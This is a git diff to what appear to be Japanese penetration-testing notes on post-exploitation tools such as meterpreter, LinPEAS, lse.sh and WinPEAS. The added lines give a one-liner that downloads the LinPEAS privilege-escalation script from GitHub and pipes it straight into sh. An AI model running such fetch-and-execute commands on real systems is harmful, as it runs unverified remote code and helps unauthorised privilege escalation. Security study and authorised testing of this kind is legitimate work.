@@ -356,6 +356,15 @@ meterpreterプロンプト下でmigrateコマンドを使うことで、バッ�
 
 ・[LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) - Linux local Privilege Escalation Awesome Script (.sh)
 
+```
+
+実行：
+curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
+
+
+```
+
+
 LinPEAS で不十分な時は、[linux-smart-enumeration(lse.sh)](https://github.com/diego-treitos/linux-smart-enumeration) 検討する。
 
 ・[WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) - Windows local Privilege Escalation Awesome Script (C#.exe and .bat)
